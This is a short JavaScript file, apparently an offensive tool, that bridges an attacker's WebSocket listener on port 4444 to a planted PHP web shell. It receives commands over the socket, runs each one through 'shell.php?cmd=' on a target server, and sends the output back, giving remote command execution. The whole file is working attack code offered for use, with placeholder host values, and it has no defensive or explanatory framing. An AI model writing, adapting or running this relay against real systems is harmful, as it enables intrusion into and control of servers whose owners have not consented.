//This script works well witht he web shell listener pythonScripts/shell.py

const ws = new WebSocket("ws://ur-Ip:4444");

ws.onopen = function() {
    console.log("WebSocket Connected");
};

ws.onmessage = function(event) {
    let cmd = event.data;
    console.log("Executing command:", cmd);  // Debug message
    
    fetch("http://url/shell.php?cmd=" + encodeURIComponent(cmd))
        .then(res => res.text())
        .then(output => {
            console.log("Command Output:", output);  // Debug message
            ws.send(output);
        })
        .catch(err => {
            console.log("Fetch Error:", err);
            ws.send("Error: " + err);
        });
};
